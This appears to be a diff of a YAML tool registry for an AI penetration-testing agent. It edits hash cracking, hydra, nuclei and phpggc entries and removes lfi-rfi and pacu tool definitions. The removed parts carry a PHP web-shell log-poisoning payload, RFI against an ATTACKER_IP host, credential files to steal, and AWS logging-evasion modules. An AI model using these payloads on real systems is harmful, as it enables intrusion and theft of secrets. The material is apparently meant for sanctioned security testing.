-        when_to_use: 'When you have multiple hashes from a database dump and want to check all of them at once. Typical scenario:
-          dump a users table with sqlmap, extract the password hash column, and batch-look up all hashes. More convenient
-          than calling lookup repeatedly. For large batches (100+), this will take several minutes due to sequential API calls
-          with rate limiting.'
-        params:
-          hashes:
-            type: array
-            required: true
-            description: 'List of hash strings to look up. Each hash should be a bare hex string. Example: [''5f4dcc3b5aa765d61d8327deb882cf99'',
-              ''e99a18c428cb38d5f260853678922e03'']. All hashes should be the same type.'
-          hash_type:
-            type: enum
-            values:
-            - auto
-            - md5
-            - sha1
-            - sha256
-            - ntlm
-            default: auto
-            description: Hash type for all hashes in the batch. Use 'auto' if you're unsure — detection is by length.
-        returns:
-          results:
-            type: array
-            description: 'Full result for each hash (same fields as lookup: hash, plaintext, source, cracked)'
-          total:
-            type: integer
-            description: Total number of hashes submitted
-          cracked_count:
-            type: integer
-            description: Number of hashes successfully recovered
-          not_found_count:
-            type: integer
-            description: Number of hashes not found in any database
-      identify:
-        description: 'Identify the type of a hash using pattern matching on hash length and format. Detection patterns: 32
-          hex chars = MD5 or NTLM (ambiguous), 40 hex chars = SHA1, 64 hex chars = SHA256, 128 hex chars = SHA512, *[40 hex]
-          = MySQL 4.1+, $2a$/$2b$ prefix = bcrypt. Returns possible types with human-readable descriptions.'
-        when_to_use: 'When you find a hash and need to determine its type before cracking with john or looking it up. Common
-          in pentesting: find a hash in a config file, database column, or web application source code and need to identify
-          it. Note: 32-character hex hashes are ambiguous between MD5 and NTLM — use context to distinguish (Windows = NTLM,
-          web app = usually MD5). For more definitive identification with john-specific format names, use john''s identify
-          method instead. This method is faster (no Docker container needed) and provides more user-friendly descriptions.'
-        params:
-          hash:
-            type: string
-            required: true
-            description: Single hash to identify. Bare hex string, no prefix needed. For bcrypt, include the full '$2a$10$...'
-              string. For MySQL, include the leading '*'.
-        returns:
-          possible_types:
-            type: array
-            description: List of possible hash type names (e.g., ['md5', 'ntlm'] for 32-char hex)
-          descriptions:
-            type: array
-            description: Human-readable descriptions of each type (e.g., 'MD5 - 128-bit hash, commonly used for passwords')
-          length:
-            type: integer
-            description: Length of the hash string
-      generate:
-        description: Generate a hash from plaintext using Python's hashlib. Supports MD5, SHA1, SHA256, SHA512, and NTLM (MD4
-          of UTF-16LE encoded input). Useful for testing and verification — generate a hash from a suspected plaintext and
-          compare it to the target hash to confirm a match.
-        when_to_use: 'Two main use cases: (1) Verify a cracked password — if you cracked ''password123'' from a hash, generate
-          the hash of ''password123'' and compare to confirm. (2) Testing — generate known hashes for testing the lookup functionality.
-          For NTLM hash generation: useful when you have a plaintext password and need the NTLM hash for pass-the-hash attacks
-          with impacket.'
-        params:
-          plaintext:
-            type: string
-            required: true
-            description: Text to hash. The exact string will be hashed — no trimming or normalization. For NTLM, the string
-              is UTF-16LE encoded before MD4 hashing (matching Windows behavior).
-          hash_type:
-            type: enum
-            values:
-            - md5
-            - sha1
-            - sha256
-            - sha512
-            - ntlm
-            default: md5
-            description: Hash algorithm. md5=MD5 (32 hex), sha1=SHA-1 (40 hex), sha256=SHA-256 (64 hex), sha512=SHA-512 (128
-              hex), ntlm=NTLM/MD4-UTF16LE (32 hex, Windows password hash format).
-        returns:
-          plaintext:
-            type: string
-            description: The original plaintext that was hashed
-          hash:
-            type: string
-            description: Generated hash as lowercase hex string
-          hash_type:
-            type: string
-            description: Hash algorithm used
   hashcat:
     name: hashcat
     kind: cli
@@ -7103,7 +6733,7 @@ tools:
       arguments are local file paths inside the container (e.g., /session/output/hashes.txt /session/output/wordlist.txt).
       Native CLI; the LLM constructs the full hashcat invocation. CPU-only inside Docker (no --gpus passthrough); requires
       --force to bypass GPU detection. Use john for format auto-detection and *2john converter scripts; use hydra for ONLINE
-      brute-force; use hash-lookup for online hash databases.'
+      brute-force; use curl for online pre-cracked hash database lookups (nitrxgen/hashtoolkit) before offline cracking.'
     image: ghcr.io/silicon-works/mcp-tools-hashcat:latest
     image_size_mb: 1030
     idle_timeout_seconds: 600
@@ -7146,7 +6776,7 @@ tools:
         reason: john ships ~300 *2john converter scripts (ssh2john, zip2john, pdf2john, office2john, etc.). hashcat does not.
           Convert first with john, then crack with either tool.
       - online brute-force against login pages (use hydra — hashcat is offline only)
-      - hash lookup in databases (use hash-lookup — try online lookup before offline cracking)
+      - hash lookup in databases (use curl for online pre-cracked DB lookup before offline cracking)
       - IKE/IPsec PSK cracking (use ike-scan.crack_psk)
       triggers:
       - hashcat
@@ -7176,8 +6806,11 @@ tools:
       reason: Use john for format auto-detection and *2john converter scripts (zip2john, ssh2john, pdf2john, office2john,
         etc.) when extracting crackable hashes from encrypted files. John is also simpler for first-pass cracking when the
         hash format is unknown.
-    - tool: hash-lookup
-      reason: Try online hash lookup before offline cracking — may find the plaintext instantly without spending CPU/GPU time.
+    - tool: curl
+      reason: 'Before spending CPU/GPU on offline cracking, try an online pre-cracked DB lookup with curl: nitrxgen (`curl
+        -sS https://www.nitrxgen.net/md5db/<md5>`) or hashtoolkit — unsalted MD5/SHA1/NTLM often resolve instantly. See curl''s
+        ''Online pre-cracked hash lookup'' usage_pattern. Salted hashes ($6$, bcrypt) are never in online DBs — go straight
+        to hashcat.'
     - tool: responder
       reason: Capture NetNTLMv2 hashes via LLMNR/NBT-NS poisoning, then crack with hashcat mode 5600.
     - tool: impacket
@@ -7828,8 +7461,8 @@ tools:
         -s 8443 10.10.10.5 https-post-form '/admin/login:username=^USER^&password=^PASS^&csrf=static_token:Invalid credentials'
       when: HTTPS form on a non-standard port. -s 8443 overrides default 443; module spec uses S= for success-string OR plain
         string for fail-string (the colon-separated 3rd field). Static CSRF tokens can be embedded; dynamic CSRF tokens (rotated
-        per response) require -m to include H= cookie/header reuse and may not work — use ffuf+web-session for dynamic CSRF
-        flows.
+        per response) require -m to include H= cookie/header reuse and may not work — for dynamic CSRF, script a curl or playwright
+        login that re-extracts the rotating token from each response and re-submits it per attempt.
     - name: Module help — print options for a specific protocol
       command: hydra -U http-post-form
       when: Print the per-module options string format for `-m`. Each protocol has different module syntax; -U is the canonical
@@ -7934,8 +7567,8 @@ tools:
       all until `FLUSH HOSTS` is run from another connection or the server times out. Stay under the limit by keeping -t 4
       and -P narrow.
     - Some hydra builds (especially older 9.x) have known issues with `http-post-form` when the response includes Set-Cookie
-      that changes between attempts (rotating CSRF). For dynamic CSRF use ffuf with `-replay-proxy` or build a web-session
-      login flow.
+      that changes between attempts (rotating CSRF). For dynamic CSRF use ffuf with `-replay-proxy` or script a curl/playwright
+      login that re-fetches and re-submits the rotating token on each attempt.
     - 'hydra reports the full `[<port>][<service>] host: <h>   login: <u>   password: <p>` line on a hit. Password-only protocols
       (snmp, vnc, redis, cisco, cisco-enable, oracle-listener) emit `host: <h>   password: <p>` with no login field — hydra
       silently ignores -l/-L/-C for these. WHEN ATTACKING THESE PROTOCOLS: do NOT pass -l/-L/-C; use only -p/-P (or -x). Passing
@@ -10181,295 +9814,6 @@ tools:
       purpose: Sub-command help for bruteforce. Positional <user_pw_file> (combo file, format `username:password` per line).
     - command: kerbrute version
       purpose: 'Print version and quit. Expect `Version: v1.0.3 (9dad6e1)` for the current image build.'
-  lfi-rfi:
-    name: lfi-rfi
-    version: '1.0'
-    description: 'Local File Inclusion (LFI) and Remote File Inclusion (RFI) testing and exploitation tool. 5 methods: test_lfi
-      (automated directory traversal with multiple encodings and depths), test_rfi (remote URL inclusion with PHP wrappers),
-      read_file (extract specific files via confirmed LFI), php_filter (read PHP source code via php://filter/convert.base64-encode),
-      log_poison (inject PHP code into log files via User-Agent/Referer/X-Forwarded-For headers for RCE). Supports Linux and
-      Windows path traversal patterns. Uses {PAYLOAD} placeholder in URLs. Authenticated testing via cookies.'
-    image: ghcr.io/silicon-works/mcp-tools-lfi-rfi:latest
-    image_size_mb: 100
-    timeout_seconds: 300
-    capabilities:
-    - lfi_testing
-    - rfi_testing
-    - path_traversal
-    - php_filters
-    - log_poisoning
-    phases:
-    - enumeration
-    - exploitation
-    requirements:
-      network: true
-      privileged: false
-    resources:
-      memory_mb: 128
-      cpu: 0.5
-    routing:
-      use_for:
-      - test URL parameter for Local File Inclusion with path traversal
-      - read arbitrary files on web server via LFI vulnerability
-      - read PHP source code via php://filter wrapper
-      - test for Remote File Inclusion vulnerability
-      - achieve RCE via LFI combined with log poisoning
-      - directory traversal testing with multiple encodings
-      never_use_for:
-      - SQL injection
-      - directory enumeration
-      - port scanning
-      triggers:
-      - file inclusion
-      - path traversal
-      - LFI
-      - RFI
-      - php filter
-      - log poison
-      - ../
-      prefer_over: []
-    methods:
-      test_lfi:
-        description: Test a URL parameter for Local File Inclusion by trying path traversal sequences (../) at multiple depths
-          with multiple encodings (plain, URL-encoded, double-URL-encoded, null byte, etc.). Tries to read /etc/passwd (Linux)
-          or C:\Windows\win.ini (Windows) as proof of concept. Uses {PAYLOAD} placeholder in the URL.
-        when_to_use: 'When a web page has a file/page/template parameter that might be vulnerable to path traversal. Examples:
-          url=''http://target/page.php?file={PAYLOAD}'', url=''http://target/index.php?page={PAYLOAD}''. The tool automatically
-          tries traversal depths 1-8 with various encodings. Set os=''linux'' or ''windows'' to target specific paths. Use
-          success_pattern for custom detection when the default /etc/passwd check doesn''t work.'
-        params:
-          url:
-            type: string
-            required: true
-            description: Target URL with {PAYLOAD} placeholder
-          os:
-            type: enum
-            values:
-            - linux
-            - windows
-            - auto
-            default: auto
-            description: Target operating system
-          depth:
-            type: integer
-            default: 8
-            description: Maximum directory traversal depth
-          encodings:
-            type: array
-            description: Encodings to try (plain, url, double-url, etc.)
-          cookie:
-            type: string
-            description: Cookie header for authenticated testing
-          headers:
-            type: object
-            description: Custom HTTP headers
-          success_pattern:
-            type: string
-            description: Regex pattern indicating successful inclusion
-          timeout:
-            type: integer
-            default: 10
-            description: Request timeout per attempt
-        returns:
-          vulnerable:
-            type: boolean
-            description: Whether LFI was found
-          vulnerabilities:
-            type: array
-            description: Working payloads and encodings
-          working_payload:
-            type: string
-            description: First successful payload
-      test_rfi:
-        description: 'Test a URL parameter for Remote File Inclusion by trying 6 default PHP wrappers: direct URL, http://,
-          https://, ftp://, data://text/plain;base64 (encodes a PHP include statement), and expect://. Replaces {PAYLOAD}
-          in the URL with each wrapper+remote_url combination. Checks for HTTP 200 with non-empty body as success indicator.
-          IMPORTANT: verify results by checking if your controlled server received an inbound request — a 200 response alone
-          does not confirm RFI.'
-        when_to_use: 'When a URL parameter might allow remote URL inclusion (typically PHP applications with allow_url_include=On).
-          Requires a controlled remote server — use netcat http_listen or a VPS to serve a test file. Workflow: (1) start
-          netcat http_listen on attacker, (2) test_rfi with remote_url pointing to your listener, (3) check http_requests
-          on the listener to verify the target fetched your URL. If allow_url_include is off, try php_filter or LFI-to-RCE
-          via log_poison instead.'
-        params:
-          url:
-            type: string
-            required: true
-            description: Target URL with {PAYLOAD} placeholder where the file/page parameter is (e.g., 'http://target/page.php?file={PAYLOAD}').
-          remote_url:
-            type: string
-            required: true
-            description: URL on your controlled server to include (e.g., 'http://ATTACKER_IP:8080/shell.txt'). The file should
-              contain PHP code if testing PHP RFI.
-          wrappers:
-            type: array
-            description: 'PHP wrappers to try. Default: ['''', ''http://'', ''https://'', ''ftp://'', ''data://text/plain;base64,'',
-              ''expect://'']. Override to test specific wrappers only.'
-          cookie:
-            type: string
-            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
-          headers:
-            type: object
-            description: Custom HTTP headers as key-value pairs.
-          timeout:
-            type: integer
-            default: 10
-            description: Request timeout per wrapper attempt in seconds.
-        returns:
-          vulnerable:
-            type: boolean
-            description: Whether any wrapper returned HTTP 200 with content (verify with remote server logs).
-          vulnerabilities:
-            type: array
-            description: Wrappers that produced a 200 response with body length — each entry has wrapper, payload, url, status_code,
-              body_length.
-      read_file:
-        description: Read a specific file through a confirmed LFI vulnerability using the known-working traversal string and
-          depth. Builds payload as (traversal * depth) + file_path, or wrapper + file_path if a PHP wrapper is specified.
-          Returns the full response body (up to 100KB). Use this after test_lfi confirms the vulnerability — copy the working
-          traversal and depth from those results.
-        when_to_use: 'After test_lfi confirms LFI, to extract specific files. Use the working traversal/depth from test_lfi
-          results. High-value files to read: /etc/shadow (password hashes), /home/*/.ssh/id_rsa (SSH keys), /var/www/html/wp-config.php
-          (database creds), .env files, /proc/self/environ (environment variables with secrets), /etc/apache2/sites-enabled/*
-          (vhost configs revealing internal paths). For PHP source code, use php_filter instead — read_file would execute
-          the PHP rather than show source.'
-        params:
-          url:
-            type: string
-            required: true
-            description: Vulnerable URL with {PAYLOAD} placeholder (same URL used in test_lfi).
-          file_path:
-            type: string
-            required: true
-            description: Absolute path of file to read (e.g., '/etc/shadow', '/home/user/.ssh/id_rsa', '/var/www/html/.env').
-              Leading slash is stripped when building traversal payload.
-          traversal:
-            type: string
-            default: ../
-            description: Traversal string that worked in test_lfi (e.g., '../', '%2e%2e%2f', '..%2f'). Must match what test_lfi
-              found.
-          depth:
-            type: integer
-            default: 8
-            description: Traversal depth (number of times to repeat the traversal string). Use the depth from test_lfi results.
-          wrapper:
-            type: string
-            description: PHP wrapper to prepend instead of traversal (e.g., 'php://filter/convert.base64-encode/resource=').
-              When set, traversal and depth are ignored.
-          cookie:
-            type: string
-            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
-          headers:
-            type: object
-            description: Custom HTTP headers as key-value pairs.
-          timeout:
-            type: integer
-            default: 15
-            description: Request timeout in seconds. Increase for large files.
-        returns:
-          content:
-            type: string
-            description: File contents (up to 100KB). Full response body — may include surrounding HTML from the vulnerable
-              page.
-          content_length:
-            type: integer
-            description: Length of the file content in the response.
-      php_filter:
-        description: 'Read a file via php://filter/convert.base64-encode/resource= wrapper, which base64-encodes the file
-          content before inclusion — preventing PHP execution and returning raw source code. The tool auto-extracts base64
-          strings from the response (regex: 20+ base64 chars) and decodes them. Does NOT require path traversal — PHP filter
-          wrapper uses absolute paths directly. Returns both raw base64 and decoded content (up to 50KB).'
-        when_to_use: 'To read PHP source code without it being executed by the server. Critical for: (1) reading PHP config
-          files to find database credentials (wp-config.php, config.php, .env), (2) reading PHP application source to find
-          hardcoded secrets or logic flaws, (3) reading any file when standard LFI fails due to PHP execution. Does NOT need
-          traversal — use file_path=''config.php'' for relative or ''/var/www/html/config.php'' for absolute. Works on any
-          PHP application with LFI where php:// wrappers are enabled (allow_url_include not required for filter wrapper).'
-        params:
-          url:
-            type: string
-            required: true
-            description: Vulnerable URL with {PAYLOAD} placeholder (e.g., 'http://target/page.php?file={PAYLOAD}').
-          file_path:
-            type: string
-            required: true
-            description: File to read. Can be relative (e.g., 'config.php', '../wp-config.php') or absolute (e.g., '/var/www/html/index.php').
-              The tool prepends 'php://filter/convert.base64-encode/resource=' automatically.
-          cookie:
-            type: string
-            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
-          headers:
-            type: object
-            description: Custom HTTP headers as key-value pairs.
-          timeout:
-            type: integer
-            default: 15
-            description: Request timeout in seconds.
-        returns:
-          decoded_content:
-            type: string
-            description: Base64-decoded file content (up to 50KB). This is the actual source code.
-          base64_content:
-            type: string
-            description: Raw base64 string extracted from the response. Useful for manual verification.
-      log_poison:
-        description: 'Achieve RCE via LFI + log poisoning in two steps: (1) inject PHP code into a server log file by sending
-          a request with the payload in a chosen HTTP header (User-Agent, Referer, or X-Forwarded-For), (2) include the poisoned
-          log file via the confirmed LFI vulnerability to trigger PHP execution. The injection request goes to the server''s
-          root URL. Then the log file is included via traversal. Checks if the payload text or ''<?php'' appears in the response
-          to verify success.'
-        when_to_use: 'To escalate LFI to Remote Code Execution when RFI (allow_url_include) is disabled. Requires: (1) confirmed
-          LFI vulnerability (run test_lfi first), (2) knowledge of the log file path. Common log paths: Apache=/var/log/apache2/access.log,
-          Nginx=/var/log/nginx/access.log, mail=/var/log/mail.log, SSH=/var/log/auth.log. Typical payload: ''<?php system($_GET["cmd"]);
-          ?>'' — after poisoning, append &cmd=id to the URL to execute commands. Use User-Agent header by default (most reliably
-          logged). If poisoning succeeds, subsequent requests to the LFI URL with the log file will execute your PHP code.'
-        params:
-          url:
-            type: string
-            required: true
-            description: Vulnerable URL with {PAYLOAD} placeholder (same URL used in test_lfi). After poisoning, the log file
-              is included via this URL.
-          log_file:
-            type: string
-            required: true
-            description: Path to the log file to poison (e.g., '/var/log/apache2/access.log', '/var/log/nginx/access.log',
-              '/var/log/mail.log'). Try read_file first to confirm the log file is readable via LFI.
-          payload:
-            type: string
-            required: true
-            description: PHP code to inject into the log (e.g., '<?php system($_GET["cmd"]); ?>' for command execution, '<?php
-              phpinfo(); ?>' for testing). Keep payloads short — logs may truncate long values.
-          traversal:
-            type: string
-            default: ../
-            description: Traversal string that works (from test_lfi results).
-          depth:
-            type: integer
-            default: 8
-            description: Traversal depth (from test_lfi results).
-          poison_header:
-            type: enum
-            values:
-            - User-Agent
-            - Referer
-            - X-Forwarded-For
-            default: User-Agent
-            description: HTTP header to inject the payload into. User-Agent is most commonly logged by Apache/Nginx. Try Referer
-              or X-Forwarded-For if User-Agent is sanitized.
-          cookie:
-            type: string
-            description: Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123').
-          timeout:
-            type: integer
-            default: 15
-            description: Request timeout in seconds for each of the two requests (poison + include).
-        returns:
-          payload_visible:
-            type: boolean
-            description: Whether the injected payload text appears in the log file response. True means the log was successfully
-              poisoned and PHP code is present.
-          body_preview:
-            type: string
-            description: First 2KB of the response after including the poisoned log file. Check for PHP execution output.
   metasploit:
     name: metasploit
     kind: mcp
@@ -12869,8 +12213,9 @@ tools:
       binary: ncat
       command: -u -w 2 <host> <port>
       when: Send a UDP datagram from stdin (pipe via cli_in_container's stdin_data). -u = UDP mode, -w 2 = receive timeout
-        2s (UDP has no FIN). Use for DNS / SNMP / syslog / NTP one-shot probes. For complex protocol-specific payloads, prefer
-        scapy.
+        2s (UDP has no FIN). Use for DNS / SNMP / syslog / NTP one-shot probes. For complex protocol-specific payloads or
+        raw L2/L3 packet crafting, write a script via exploit-runner (raw sockets need CAP_NET_RAW — toggle privileged in
+        tool.yaml).
     output_formats:
     - flag: ''
       format: text
@@ -13182,7 +12527,11 @@ tools:
     - tool: impacket
       reason: wmiexec/psexec/secretsdump for non-NetExec remote execution and Kerberos ticket operations
     - tool: evil-winrm
-      reason: Dedicated WinRM shell with pywinrm for file upload/download via PowerShell base64 chunking
+      reason: 'netexec winrm is NTLM-ONLY and built for multi-target spraying + SAM/LSA dumping. Switch to evil-winrm (kind:cli,
+        pypsrp) when you need: (a) Kerberos-authenticated WinRM — netexec winrm CANNOT do Kerberos, evil-winrm does it via
+        ccache (live-verified on Forest 2026-05-17); (b) native PSRP file upload/download (copy()/fetch(), not base64 chunking);
+        (c) a single-host post-foothold shell. Use netexec winrm to validate creds across a subnet, evil-winrm for the actual
+        Kerberos/file-transfer work on one host.'
     - tool: bloodhound
       reason: Use bloodhound for BloodHound data collection — writes JSON to /session/ unlike nxc's --bloodhound which traps
         files in container.
@@ -13683,8 +13032,6 @@ tools:
     - tool: ffuf
       reason: For directory and content discovery — ffuf finds endpoints, nikto checks server-level misconfigurations on the
         discovered host
-    - tool: web-fingerprint
-      reason: Faster signature-based tech detection — try web-fingerprint first; nikto's -Display V banner-grabs are slower
     - tool: curl
       reason: For one-shot probes to confirm a single nikto finding (e.g., verify a default file actually exists, check a
         header)
@@ -13767,11 +13114,11 @@ tools:
       command: nikto -h http://{target} -id 'admin:password' -Format json -output /session/output/nikto-auth.json -Display
         P -nointeractive
       when: Target has HTTP Basic auth on the area you want scanned. -id format is 'user:pass' or 'user:pass:realm' if multiple
-        realms exist. Pull credentials from the engagement workflow (web-session, prior login, default creds list).
+        realms exist. Pull credentials from the engagement workflow (a prior curl/playwright login, default creds list).
     - name: Targeted plugin scan
       command: nikto -h http://{target} -Plugins 'apache_expect_xss,headers,cookies' -Format json -output /session/output/nikto-plugins.json
         -Display P -nointeractive
-      when: Run only specific plugins instead of all categories. Useful after web-fingerprint identifies the stack — e.g.,
+      when: Run only specific plugins instead of all categories. Useful after nuclei -tags tech identifies the stack — e.g.,
         -Plugins 'apache_expect_xss' for Apache-only checks. Use `nikto -list-plugins` to see available plugins.
     - name: Stealth-tuned scan (paced requests)
       command: nikto -h http://{target} -Tuning 23 -Pause 1 -timeout 30 -Format json -output /session/output/nikto-stealth.json
@@ -14472,9 +13819,6 @@ tools:
     - tool: nmap
       reason: Run nmap first to enumerate open ports and services; feed identified web services into nuclei for template-based
         vulnerability scanning
-    - tool: web-fingerprint
-      reason: Faster signature-based tech detection — try web-fingerprint first; fall back to nuclei -tags tech for templates
-        covering more technologies
     - tool: ffuf
       reason: For directory and parameter discovery — once ffuf finds endpoints, scan them with nuclei for known vulnerabilities
     - tool: curl
@@ -14623,19 +13967,19 @@ tools:
     usage_patterns:
     - name: Critical-only quick scan (single URL)
       command: nuclei -u {url} -severity critical -jsonl -o /session/output/nuclei-crit.jsonl -no-stdin -disable-update-check
-      when: Fast initial pass for the highest-impact findings only. Pairs with web-fingerprint or nmap output. -severity critical
-        strips ~99% of templates so the scan finishes quickly. Always set -no-stdin in container runs (prevents nuclei from
-        blocking on closed stdin) and -disable-update-check for reproducible runs.
+      when: Fast initial pass for the highest-impact findings only. Pairs with nmap output or an initial -as/-tags tech fingerprint
+        pass. -severity critical strips ~99% of templates so the scan finishes quickly. Always set -no-stdin in container
+        runs (prevents nuclei from blocking on closed stdin) and -disable-update-check for reproducible runs.
     - name: Tag-filtered CVE + exposure scan
       command: nuclei -u {url} -tags cve,exposure -severity high,critical -jsonl -o /session/output/nuclei-cve.jsonl -no-stdin
         -disable-update-check
-      when: Scoped scan for known CVEs and information-disclosure exposures at high+critical severity. Use after web-fingerprint
-        identifies the technology stack. -tags is comma-separated; combine cve / rce / exposure / misconfig / default-login
-        as the situation calls for.
+      when: Scoped scan for known CVEs and information-disclosure exposures at high+critical severity. Use after an -as/-tags
+        tech pass (or nmap) identifies the technology stack. -tags is comma-separated; combine cve / rce / exposure / misconfig
+        / default-login as the situation calls for.
     - name: Targeted single-CVE check by template ID
       command: nuclei -u {url} -id {cve_id} -jsonl -o /session/output/nuclei-{cve_id}.jsonl -no-stdin -disable-update-check
       when: 'Verify a specific CVE without running the full set. Example: -id CVE-2021-44228 (Log4Shell). -id is a precise
-        filter (template ID match), so the scan completes in seconds. Use when nmap or web-fingerprint identified a vulnerable
+        filter (template ID match), so the scan completes in seconds. Use when nmap or a -tags tech pass identified a vulnerable
         software version and you want to confirm the exploit path.'
     - name: Workflow-driven scan
       command: nuclei -u {url} -w {workflow_path} -jsonl -o /session/output/nuclei-workflow.jsonl -no-stdin -disable-update-check
@@ -14645,7 +13989,7 @@ tools:
     - name: Authenticated scan with custom headers
       command: 'nuclei -u {url} -H ''Cookie: PHPSESSID={session_cookie}'' -severity high,critical -jsonl -o /session/output/nuclei-auth.jsonl
         -no-stdin -disable-update-check'
-      when: Scan endpoints behind a login or WAF. Pull the session cookie from web-session or a manual login first. -H is
+      when: Scan endpoints behind a login or WAF. Pull the session cookie from a curl login or a manual login first. -H is
         repeatable for multiple headers (e.g., Authorization Bearer + custom CSRF header).
     - name: Auto-scan via Wappalyzer-style tech detection
       command: nuclei -u {url} -as -severity critical,high -jsonl -o /session/output/nuclei-auto.jsonl -no-stdin -disable-update-check
@@ -14658,8 +14002,10 @@ tools:
         Combine with tunnel MCP for scanning internal targets via SSH SOCKS proxy.
     - name: Tech-detection only (template-based fingerprinting)
       command: nuclei -u {url} -tags tech -jsonl -o /session/output/nuclei-tech.jsonl -no-stdin -disable-update-check
-      when: Use nuclei's ~810 tech-tagged templates to identify CMS, framework, server software. Slower than web-fingerprint's
-        signature matching but covers more technologies. Good fallback when web-fingerprint returns sparse results.
+      when: PRIMARY technology-fingerprint method (replaces the retired web-fingerprint tool). Use nuclei's ~810 tech-tagged
+        templates to identify CMS, framework, JS libs, server software — far broader than web-fingerprint's ~40 hand-rolled
+        signatures. Pair with `-as` for Wappalyzer-style auto-detect; for raw header/version disclosure use `curl -D -`; for
+        the Shodan favicon-hash pivot use exploit-runner's favicon-mmh3 pattern.
     - name: Stealth-tuned scan (low rate, throttled)
       command: nuclei -u {url} -tags cve -severity critical -rate-limit 20 -c 5 -timeout 15 -jsonl -o /session/output/nuclei-stealth.jsonl
         -no-stdin -disable-update-check
@@ -14860,129 +14206,6 @@ tools:
       purpose: List all loaded templates (combine with -tags / -severity to preview the scope before running a real scan)
     - command: nuclei -tl -tags cve
       purpose: List templates for a specific tag — useful when planning a scoped scan
-  pacu:
-    name: pacu
-    version: '1.7'
-    description: 'AWS exploitation framework via Rhino Security Labs Pacu v1.7. 4 methods: list_modules (list 50+ attack modules),
-      run_module (execute any Pacu module with AWS credentials), privesc_scan (scan for 21+ IAM privilege escalation paths),
-      whoami (identify current AWS identity and permissions). Modules cover IAM privesc, Lambda exploitation, EC2 instance
-      compromise, S3 exfiltration, CloudTrail evasion, persistence, and lateral movement. For raw AWS API access use aws.
-      For attack path analysis use cloudfox.'
-    image: ghcr.io/silicon-works/mcp-tools-pacu:latest
-    image_size_mb: 600
-    timeout_seconds: 600
-    capabilities:
-    - aws_exploitation
-    - iam_privilege_escalation
-    - aws_persistence
-    - aws_enumeration
-    phases:
-    - enumeration
-    - exploitation
-    - post-exploitation
-    requirements:
-      network: true
-      privileged: false
-    resources:
-      memory_mb: 512
-      cpu: 1.0
-    routing:
-      use_for:
-      - scan for IAM privilege escalation paths in AWS
-      - enumerate IAM users, roles, policies, and permissions comprehensively
-      - exploit AWS misconfigurations (Lambda backdoors, EC2 instance compromise)
-      - establish persistence in AWS (IAM backdoor, cross-account roles)
-      - evade CloudTrail and GuardDuty detection
-      never_use_for:
-      - raw AWS CLI commands (use aws — pacu is for exploitation modules)
-      - AWS compliance auditing (use prowler)
-      - S3 bucket brute-force (use s3scanner)
-      triggers:
-      - pacu
-      - IAM privesc
-      - AWS privilege escalation
-      - AWS exploitation
-      - AWS persistence
-      - AWS enumeration
-      - cloud exploitation
-      prefer_over: []
-    see_also:
-    - tool: aws
-      reason: aws gives raw API access for manual commands. pacu provides pre-built exploitation modules with embedded knowledge
-        of 21+ privesc techniques.
-    - tool: cloudfox
-      reason: cloudfox does cross-service attack path analysis (read-only). pacu actively exploits the discovered paths.
-    - tool: prowler
-      reason: prowler finds misconfigurations (defensive). pacu exploits them (offensive).
-    methods:
-      list_modules:
-        description: List all available Pacu exploitation modules (50+).
-        when_to_use: Reference — discover which modules are available for enumeration, exploitation, persistence, and evasion.
-        params: {}
-        returns:
-          modules:
-            type: array
-            description: Available module names.
-          module_count:
-            type: integer
-            description: Total modules.
-      run_module:
-        description: Execute a specific Pacu module with AWS credentials.
-        when_to_use: After identifying a module to run from list_modules. Provide AWS credentials and the module name.
-        params:
-          access_key_id:
-            type: string
-            required: true
-            description: AWS access key ID.
-          secret_access_key:
-            type: string
-            required: true
-            description: AWS secret access key.
-          module:
-            type: string
-            required: true
-            description: Module name (e.g., 'iam__enum_permissions', 'lambda__enum', 's3__enum').
-          module_args:
-            type: string
-            description: Module-specific arguments.
-          timeout:
-            type: integer
-            default: 300
-            description: Execution timeout in seconds.
-        returns: {}
-      privesc_scan:
-        description: Scan for IAM privilege escalation paths using Pacu's iam__privesc_scan module. Checks 21+ privesc techniques.
-        when_to_use: After obtaining AWS credentials — check if the compromised identity can escalate to higher privileges.
-        params:
-          access_key_id:
-            type: string
-            required: true
-            description: AWS access key ID.
-          secret_access_key:
-            type: string
-            required: true
-            description: AWS secret access key.
-          timeout:
-            type: integer
-            default: 300
-            description: Scan timeout.
-        returns:
-          privesc_found:
-            type: boolean
-            description: Whether privilege escalation paths were found.
-      whoami:
-        description: Identify the current AWS identity and enumerate basic permissions.
-        when_to_use: First step after obtaining AWS credentials — understand who you are and what you can do.
-        params:
-          access_key_id:
-            type: string
-            required: true
-            description: AWS access key ID.
-          secret_access_key:
-            type: string
-            required: true
-            description: AWS secret access key.
-        returns: {}
   phpggc:
     name: phpggc
     kind: cli
@@ -15106,8 +14329,8 @@ tools:
     - name: Filter chains by framework name
       command: phpggc -l -n WordPress
       when: Narrow the chain list to a specific framework or CMS. `-n` accepts a substring/regex matched against the chain
-        NAME column; `WordPress` matches `WordPress/RCE1`, `WordPress/RCE2`, etc. Use after fingerprinting the target (web-fingerprint,
-        nuclei, manual recon) to enumerate candidate chains. Combine with `-cve <CVE-ID>` to filter by published CVE.
+        NAME column; `WordPress` matches `WordPress/RCE1`, `WordPress/RCE2`, etc. Use after fingerprinting the target (nuclei
+        -tags tech, manual recon) to enumerate candidate chains. Combine with `-cve <CVE-ID>` to filter by published CVE.
     - name: Get info on a specific chain
       command: phpggc -i Laravel/RCE1
       when: Before generating a payload, run `-i` to see the chain's required positional ARGUMENTS, affected version range,
@@ -15147,10 +14370,9 @@ tools:
         step (curl POST body, exploit-runner script, etc.). `-o <path>` is phpggc's native file-output flag.
     - name: Filter list by CVE
       command: phpggc -l -cve CVE-2018-15133
-      when: When the target has a known vulnerable component (often surfaced from web-fingerprint, nuclei, or external CVE
-        intel) but you don't yet know which phpggc chain corresponds. `-cve <CVE-ID>` filters the chain table to chains tagged
-        with that CVE — e.g., `CVE-2018-15133` (Laravel deserialization) maps to `Laravel/RCE1`. Combine with `-n` to further
-        narrow.
+      when: When the target has a known vulnerable component (often surfaced from nuclei -tags tech or external CVE intel)
+        but you don't yet know which phpggc chain corresponds. `-cve <CVE-ID>` filters the chain table to chains tagged with
+        that CVE — e.g., `CVE-2018-15133` (Laravel deserialization) maps to `Laravel/RCE1`. Combine with `-n` to further narrow.
     - name: Verify gadget actually fires (-t, dangerous)
       command: phpggc Laravel/RCE1 system whoami -t
